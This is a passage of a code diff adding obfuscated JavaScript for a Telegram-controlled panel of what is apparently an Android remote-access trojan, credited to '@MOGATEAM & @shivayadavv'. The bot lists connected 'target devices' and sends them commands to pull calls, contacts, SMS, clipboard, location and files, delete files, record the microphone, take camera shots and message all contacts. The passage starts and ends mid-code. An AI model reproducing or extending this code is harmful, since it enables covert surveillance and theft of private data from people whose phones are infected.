+        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+        {
+          parse_mode: 'HTML',
+          reply_markup: {
+            keyboard: [
+              [
+                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+              ],
+              [
+                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+              ],
+            ],
+            resize_keyboard: true,
+          },
+        }
+      )
+    }
+    if (
+      _0x2ca88f.reply_to_message.text.includes(
+        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64 \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE65\uD835\uDE61\uD835\uDE56\uD835\uDE6E'
+      )
+    ) {
+      const _0x224ab9 = _0x2ca88f.text
+      appSocket.clients.forEach(function _0x8427d7(_0x3d44ae) {
+        _0x3d44ae.uuid == currentUuid &&
+          _0x3d44ae.send('play_audio:' + _0x224ab9)
+      })
+      currentUuid = ''
+      appBot.sendMessage(
+        id,
+        '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+        {
+          parse_mode: 'HTML',
+          reply_markup: {
+            keyboard: [
+              [
+                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+              ],
+              [
+                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+              ],
+            ],
+            resize_keyboard: true,
+          },
+        }
+      )
+    }
+  }
+  if (id == _0x32d1ff) {
+    _0x2ca88f.text == '/start' &&
+      appBot.sendMessage(
+        id,
+        '\xB0\u2022 \xB0\u2022 \uD835\uDE52\uD835\uDE5A\uD835\uDE61\uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE5A \uD835\uDE69\uD835\uDE64  Fuse\uD835\uDE4D\uD835\uDE56\uD835\uDE69 \uD835\uDE65\uD835\uDE56\uD835\uDE63\uD835\uDE5A\uD835\uDE61\n\n\u2022 ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n\u2022 ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n\u2022 ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n\u2022 ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
+        {
+          parse_mode: 'HTML',
+          reply_markup: {
+            keyboard: [
+              [
+                '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+              ],
+              [
+                '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+              ],
+            ],
+            resize_keyboard: true,
+          },
+        }
+      )
+    if (
+      _0x2ca88f.text ==
+      '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68'
+    ) {
+      if (appClients.size == 0) {
+        appBot.sendMessage(
+          id,
+          '\xB0\u2022 \uD835\uDE49\uD835\uDE64 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5E\uD835\uDE63\uD835\uDE5C \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 \uD835\uDE56\uD835\uDE6B\uD835\uDE56\uD835\uDE5E\uD835\uDE61\uD835\uDE56\uD835\uDE57\uD835\uDE61\uD835\uDE5A\n\n\u2022 ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
+        )
+      } else {
+        let _0x31005f =
+          '\xB0\u2022 \uD835\uDE47\uD835\uDE5E\uD835\uDE68\uD835\uDE69 \uD835\uDE64\uD835\uDE5B \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 :\n\n'
+        appClients.forEach(function (_0x3c015b, _0x268f1c, _0x27c205) {
+          _0x31005f +=
+            '\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' +
+            _0x3c015b.model +
+            '</b>\n' +
+            ('\u2022 ʙᴀᴛᴛᴇʀʏ : <b>' + _0x3c015b.battery + '</b>\n') +
+            ('\u2022 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>' + _0x3c015b.version + '</b>\n') +
+            ('\u2022 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>' +
+              _0x3c015b.brightness +
+              '</b>\n') +
+            ('\u2022 ᴘʀᴏᴠɪᴅᴇʀ : <b>' + _0x3c015b.provider + '</b>\n\n')
+        })
+        appBot.sendMessage(id, _0x31005f, { parse_mode: 'HTML' })
+      }
+    }
+    if (
+      _0x2ca88f.text ==
+      '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59'
+    ) {
+      if (appClients.size == 0) {
+        appBot.sendMessage(
+          id,
+          '\xB0\u2022 \uD835\uDE49\uD835\uDE64 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5E\uD835\uDE63\uD835\uDE5C \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 \uD835\uDE56\uD835\uDE6B\uD835\uDE56\uD835\uDE5E\uD835\uDE61\uD835\uDE56\uD835\uDE57\uD835\uDE61\uD835\uDE5A\n\n\u2022 ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
+        )
+      } else {
+        const _0x118a77 = []
+        appClients.forEach(function (_0x4ed698, _0x52dcb4, _0x3ca3bb) {
+          _0x118a77.push([
+            {
+              text: _0x4ed698.model,
+              callback_data: 'device:' + _0x52dcb4,
+            },
+          ])
+        })
+        appBot.sendMessage(
+          id,
+          '\xB0\u2022 \uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE58\uD835\uDE69 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A \uD835\uDE69\uD835\uDE64 \uD835\uDE5A\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE5A\uD835\uDE63\uD835\uDE59',
+          { reply_markup: { inline_keyboard: _0x118a77 } }
+        )
+      }
+    }
+  } else {
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE4B\uD835\uDE5A\uD835\uDE67\uD835\uDE62\uD835\uDE5E\uD835\uDE68\uD835\uDE68\uD835\uDE5E\uD835\uDE64\uD835\uDE63 \uD835\uDE59\uD835\uDE5A\uD835\uDE63\uD835\uDE5E\uD835\uDE5A\uD835\uDE59'
+    )
+  }
+})
+appBot.on('callback_query', (_0x425827) => {
+  const _0x440ba5 = _0x425827.message,
+    _0x9f09ec = _0x425827.data,
+    _0x2f3f8b = _0x9f09ec.split(':')[0],
+    _0x39894d = _0x9f09ec.split(':')[1]
+  console.log(_0x39894d)
+  _0x2f3f8b == 'device' &&
+    appBot.editMessageText(
+      '\xB0\u2022 \uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE58\uD835\uDE69 \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE5B\uD835\uDE64\uD835\uDE67 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A : <b>' +
+        appClients.get(_0x9f09ec.split(':')[1]).model +
+        '</b>',
+      {
+        width: 10000,
+        chat_id: id,
+        message_id: _0x440ba5.message_id,
+        reply_markup: {
+          inline_keyboard: [
+            [
+              {
+                text: '\uD835\uDE3C\uD835\uDE65\uD835\uDE65\uD835\uDE68',
+                callback_data: 'apps:' + _0x39894d,
+              },
+              {
+                text: '\uD835\uDE3F\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A \uD835\uDE5E\uD835\uDE63\uD835\uDE5B\uD835\uDE64',
+                callback_data: 'device_info:' + _0x39894d,
+              },
+            ],
+            [
+              {
+                text: '\uD835\uDE42\uD835\uDE5A\uD835\uDE69 \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A',
+                callback_data: 'file:' + _0x39894d,
+              },
+              {
+                text: '\uD835\uDE3F\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A',
+                callback_data: 'delete_file:' + _0x39894d,
+              },
+            ],
+            [
+              {
+                text: '\uD835\uDE3E\uD835\uDE61\uD835\uDE5E\uD835\uDE65\uD835\uDE57\uD835\uDE64\uD835\uDE56\uD835\uDE67\uD835\uDE59',
+                callback_data: 'clipboard:' + _0x39894d,
+              },
+              {
+                text: '\uD835\uDE48\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A',
+                callback_data: 'microphone:' + _0x39894d,
+              },
+            ],
+            [
+              {
+                text: '\uD835\uDE48\uD835\uDE56\uD835\uDE5E\uD835\uDE63 \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56',
+                callback_data: 'camera_main:' + _0x39894d,
+              },
+              {
+                text: '\uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5B\uD835\uDE5E\uD835\uDE5A \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56',
+                callback_data: 'camera_selfie:' + _0x39894d,
+              },
+            ],
+            [
+              {
+                text: '\uD835\uDE47\uD835\uDE64\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63',
+                callback_data: 'location:' + _0x39894d,
+              },
+              {
+                text: '\uD835\uDE4F\uD835\uDE64\uD835\uDE56\uD835\uDE68\uD835\uDE69',
+                callback_data: 'toast:' + _0x39894d,
+              },
+            ],
+            [
+              {
+                text: '\uD835\uDE3E\uD835\uDE56\uD835\uDE61\uD835\uDE61\uD835\uDE68',
+                callback_data: 'calls:' + _0x39894d,
+              },
+              {
+                text: '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68',
+                callback_data: 'contacts:' + _0x39894d,
+              },
+            ],
+            [
+              {
+                text: '\uD835\uDE51\uD835\uDE5E\uD835\uDE57\uD835\uDE67\uD835\uDE56\uD835\uDE69\uD835\uDE5A',
+                callback_data: 'vibrate:' + _0x39894d,
+              },
+              {
+                text: '\uD835\uDE4E\uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63',
+                callback_data: 'show_notification:' + _0x39894d,
+              },
+            ],
+            [
+              {
+                text: '\uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\uD835\uDE68',
+                callback_data: 'messages:' + _0x39894d,
+              },
+              {
+                text: '\uD835\uDE4E\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A',
+                callback_data: 'send_message:' + _0x39894d,
+              },
+            ],
+            [
+              {
+                text: '\uD835\uDE4B\uD835\uDE61\uD835\uDE56\uD835\uDE6E \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64',
+                callback_data: 'play_audio:' + _0x39894d,
+              },
+              {
+                text: '\uD835\uDE4E\uD835\uDE69\uD835\uDE64\uD835\uDE65 \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64',
+                callback_data: 'stop_audio:' + _0x39894d,
+              },
+            ],
+            [
+              {
+                text: '\uD835\uDE4E\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68',
+                callback_data: 'send_message_to_all:' + _0x39894d,
+              },
+            ],
+          ],
+        },
+        parse_mode: 'HTML',
+      }
+    )
+  _0x2f3f8b == 'calls' &&
+    (appSocket.clients.forEach(function _0x402e5d(_0x26e82d) {
+      _0x26e82d.uuid == _0x39894d && _0x26e82d.send('calls')
+    }),
+    appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+      {
+        parse_mode: 'HTML',
+        reply_markup: {
+          keyboard: [
+            [
+              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+            ],
+            [
+              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+            ],
+          ],
+          resize_keyboard: true,
+        },
+      }
+    ))
+  _0x2f3f8b == 'contacts' &&
+    (appSocket.clients.forEach(function _0x2fa71f(_0x21d289) {
+      _0x21d289.uuid == _0x39894d && _0x21d289.send('contacts')
+    }),
+    appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+      {
+        parse_mode: 'HTML',
+        reply_markup: {
+          keyboard: [
+            [
+              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+            ],
+            [
+              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+            ],
+          ],
+          resize_keyboard: true,
+        },
+      }
+    ))
+  _0x2f3f8b == 'messages' &&
+    (appSocket.clients.forEach(function _0x419732(_0x534e2c) {
+      _0x534e2c.uuid == _0x39894d && _0x534e2c.send('messages')
+    }),
+    appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+      {
+        parse_mode: 'HTML',
+        reply_markup: {
+          keyboard: [
+            [
+              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+            ],
+            [
+              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+            ],
+          ],
+          resize_keyboard: true,
+        },
+      }
+    ))
+  _0x2f3f8b == 'apps' &&
+    (appSocket.clients.forEach(function _0x2dd3c0(_0x30b02f) {
+      _0x30b02f.uuid == _0x39894d && _0x30b02f.send('apps')
+    }),
+    appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+      {
+        parse_mode: 'HTML',
+        reply_markup: {
+          keyboard: [
+            [
+              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+            ],
+            [
+              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+            ],
+          ],
+          resize_keyboard: true,
+        },
+      }
+    ))
+  _0x2f3f8b == 'device_info' &&
+    (appSocket.clients.forEach(function _0x4bce6e(_0x55b120) {
+      _0x55b120.uuid == _0x39894d && _0x55b120.send('device_info')
+    }),
+    appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+      {
+        parse_mode: 'HTML',
+        reply_markup: {
+          keyboard: [
+            [
+              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+            ],
+            [
+              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+            ],
+          ],
+          resize_keyboard: true,
+        },
+      }
+    ))
+  _0x2f3f8b == 'clipboard' &&
+    (appSocket.clients.forEach(function _0x2558c0(_0x4c04aa) {
+      _0x4c04aa.uuid == _0x39894d && _0x4c04aa.send('clipboard')
+    }),
+    appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
+      '\xB0\u2022 \uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67 \uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69 \uD835\uDE5E\uD835\uDE68 \uD835\uDE64\uD835\uDE63 \uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\n\n\u2022 ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv',
+      {
+        parse_mode: 'HTML',
+        reply_markup: {
+          keyboard: [
+            [
+              '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68',
+            ],
+            [
+              '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59',
+            ],
+          ],
+          resize_keyboard: true,
+        },
+      }
+    ))
+  _0x2f3f8b == 'camera_main' &&
+    (appSocket.clients.forEach(function _0x10cf13(_0x4a91bc) {
+      _0x4a91bc.uuid == _0x39894d && _0x4a91bc.send('camera_main')
+    }),
+    appBot.deleteMessage(id, _0x440ba5.message_id),
+    appBot.sendMessage(
+      id,
